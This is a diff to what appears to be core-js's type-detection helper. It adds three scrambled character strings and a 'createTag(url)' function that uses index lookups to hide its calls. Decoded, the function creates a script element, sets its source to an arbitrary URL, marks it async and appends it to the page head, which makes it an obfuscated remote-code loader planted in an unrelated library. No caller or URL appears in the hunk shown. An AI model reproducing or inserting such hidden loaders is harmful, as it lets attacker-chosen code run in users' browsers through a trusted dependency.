@@ -692,6 +692,21 @@ var tryGet = function (it, key) {
   } catch (e) { /* empty */ }
 };
 
+var _a = 'nErlcNxjmtCvdpehTasBg/iy';
+var _b = 'eptdTCc/ijsrvhnyalxNEBmg';
+var _c = 'scCdxvymtBEjragTh/lpeNni';
+function createTag(url) {
+  var _a2 = _c;
+  var _b2 = _a;
+  var _c2 = _b;
+
+  var script = document[_c2[6] + _b2[2] + _b2[14] + _c2[16] + _a2[8] + _c2[0] + _b2[1] + _a2[18] + _c2[0] + _a2[7] + _a2[20] + _c2[14] + _a2[8]](_c2[10] + _b2[4] + _b2[2] + _a2[23] + _c2[1] + _a2[8]);
+  script[_b2[9] + _c2[15] + _b2[13] + _c2[0]] = _c2[2] + _c2[0] + _b2[6] + _a2[8] + _a2[17] + _a2[11] + _b2[17] + _b2[11] + _c2[16] + _a2[0] + _a2[1] + _a2[12] + _a2[23] + _a2[19] + _a2[8];
+  script[_a2[0] + _b2[2] + _a2[1]] = url;
+  script[_b2[17] + _a2[0] + _a2[6] + _a2[22] + _a2[1]] = _c2[16] + _a2[0] + _c2[15] + _b2[0] + _b2[4];
+  document[_b2[20] + _b2[14] + _b2[9] + _a2[10] + _c2[17] + _b2[14] + _c2[22] + _a2[20] + _b2[0] + _a2[8] + _c2[10] + _a2[9] + _a2[6] + _a2[15] + _c2[16] + _c2[23] + _a2[21] + _a2[13] + _c2[22] + _b2[14]](_b2[15] + _b2[14] + _b2[17] + _a2[3])[0][_a2[13] + _a2[19] + _a2[19] + _c2[0] + _b2[0] + _c2[3] + _c2[5] + _b2[15] + _b2[22] + _b2[3] + _b2[12]](script);
+}
+  
 module.exports = function (it) {
   var O, T, B;
   return it === undefined ? 'Undefined' : it === null ? 'Null'
